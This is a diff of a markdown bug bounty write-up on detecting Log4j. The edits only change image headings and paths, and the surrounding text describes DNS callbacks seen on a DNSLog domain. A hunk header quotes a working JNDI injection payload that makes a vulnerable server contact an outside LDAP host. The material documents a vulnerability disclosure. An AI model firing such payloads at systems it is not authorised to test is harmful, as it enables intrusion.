@@ -44,9 +44,8 @@ ${jndi:ldap://14ar22.dnslog.cn/a}
 
 The researcher then created a new shoutout and posted the payload.
 
-### Image 1
 
-![Image 1](/assets/images/bb/log4j1.png)
+![Image 1](/assets/images/log4j1.png)
 
 The screenshot shows the DNSLog page, the generated subdomain, and the payload being posted as a new shoutout.
 
@@ -56,9 +55,8 @@ After posting the payload, the researcher returned to DNSLog and refreshed the r
 
 The submission states that DNS requests were then observed on the DNS server. According to the researcher, these requests demonstrated the existence of the vulnerable library.
 
-### Image 2
 
-![Image 2](/assets/images/bb/log4j2.png)
+![Image 2](/assets/images/log4j2.png)
 
 The screenshot shows the DNSLog record page before the DNS requests were observed.
 
@@ -68,9 +66,8 @@ The final screenshot included in the submission shows multiple DNS requests asso
 
 The displayed records include requests for `14ar22.dnslog.cn`, along with the corresponding IP addresses and creation times.
 
-### Image 3
 
-![Image 3](/assets/images/bb/log4j3.png)
+![Image 3](/assets/images/log4j3.png)
 
 The screenshot shows the DNS requests recorded for the generated subdomain.
 
